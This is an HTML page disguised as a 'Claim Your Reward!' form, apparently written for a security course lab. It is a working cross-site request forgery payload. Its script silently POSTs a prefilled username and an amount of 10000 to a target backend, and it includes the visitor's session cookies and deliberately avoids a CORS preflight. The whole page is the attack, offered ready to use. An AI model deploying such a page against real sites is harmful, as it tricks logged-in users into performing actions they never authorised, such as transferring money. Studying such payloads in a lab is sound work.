<html>
<body>
  <h1>Claim Your Reward!</h1>
  <p>Fill out the details below:</p>

  <form id="rewardForm">
    <label for="username">Username:</label>
    <input type="text" id="username" value="ljl5837"><br><br>

    <label for="fname">First Name:</label>
    <input type="text" id="fname" value="lks"><br><br>

    <label for="amount">Amount:</label>
    <input type="number" id="amount" value="10000"><br><br>

    <label for="comment">Comment:</label>
    <input type="text" id="comment" value="what's your name"><br><br>

    <button type="button" onclick="submitForm()">Submit</button>
  </form>

  <script>
    function submitForm() {
      const jsonPayload = JSON.stringify({
        username: document.getElementById('username').value,
        fname: document.getElementById('fname').value,
        amount: document.getElementById('amount').value,
        comment: document.getElementById('comment').value,
      });

      fetch('https://cse543.aranjbar.me/backend/tfourtwo', {
        method: 'POST',
        mode: 'no-cors', // Disable CORS preflight
        headers: {
          'Content-Type': 'application/json'
        },
        body: jsonPayload,
        credentials: 'include' // Include session cookies
      })
      .then(() => {
        alert('Request sent!');
      })
      .catch(error => {
        console.error('Error:', error);
      });
    }
  </script>
</body>
</html>
